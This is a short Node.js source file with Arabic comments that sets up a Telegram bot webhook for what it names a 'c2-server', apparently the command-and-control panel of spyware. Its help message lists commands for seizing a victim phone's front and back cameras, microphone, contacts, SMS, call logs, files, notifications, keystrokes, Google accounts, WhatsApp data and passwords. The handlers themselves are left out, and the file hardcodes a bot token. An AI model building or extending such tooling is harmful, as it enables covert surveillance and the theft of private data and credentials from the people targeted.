const express = require('express');
const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = '7604669338:AAF-Bor_OJ2nHuP3H_-7E8QXVptnTeqFEUA';
const SERVER_URL = 'https://c2-server-ufyp.onrender.com';

const app = express();
app.use(express.json());

// نقطة استقبال الأوامر من تليجرام
app.post(`/webhook/${BOT_TOKEN}`, (req, res) => {
    const bot = new TelegramBot(BOT_TOKEN);
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

app.get('/', (req, res) => res.send('Webhook active'));

// تعريف الأوامر (بدون polling)
const bot = new TelegramBot(BOT_TOKEN, { polling: false });

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, '✅ البوت يعمل عبر Webhook! أرسل /help');
});
bot.onText(/\/help/, (msg) => {
    bot.sendMessage(msg.chat.id, '📱 الأوامر: /camera_front, /camera_back, /mic, /contacts, /sms, /call_logs, /files, /notifications, /keylog, /google_accounts, /whatsapp, /passwords');
});
// أضف باقي الأوامر بنفس الطريقة (يمكنك نسخها من الكود السابق)

const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
    console.log(`✅ Server listening on ${PORT}`);
    const botSetup = new TelegramBot(BOT_TOKEN);
    await botSetup.setWebHook(`${SERVER_URL}/webhook/${BOT_TOKEN}`);
    console.log('✅ Webhook set successfully');
});
